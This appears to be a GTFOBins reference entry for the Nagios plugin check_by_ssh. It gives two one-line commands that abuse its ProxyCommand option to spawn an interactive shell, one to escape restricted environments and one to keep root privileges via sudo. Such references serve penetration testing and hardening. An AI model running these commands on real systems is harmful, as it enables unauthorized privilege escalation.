# GTFOBin: check_by_ssh

This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

When `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios
Plugins project in it’s default configuration is used, it does not work anymore.

It does still work on previous versions from the Nagios Plugins project or
all versions from the Monitoring Project (e.g. used by Ubuntu/Debian).

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

The shell will only last 10 seconds.

```
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The shell will only last 10 seconds.

```
sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
```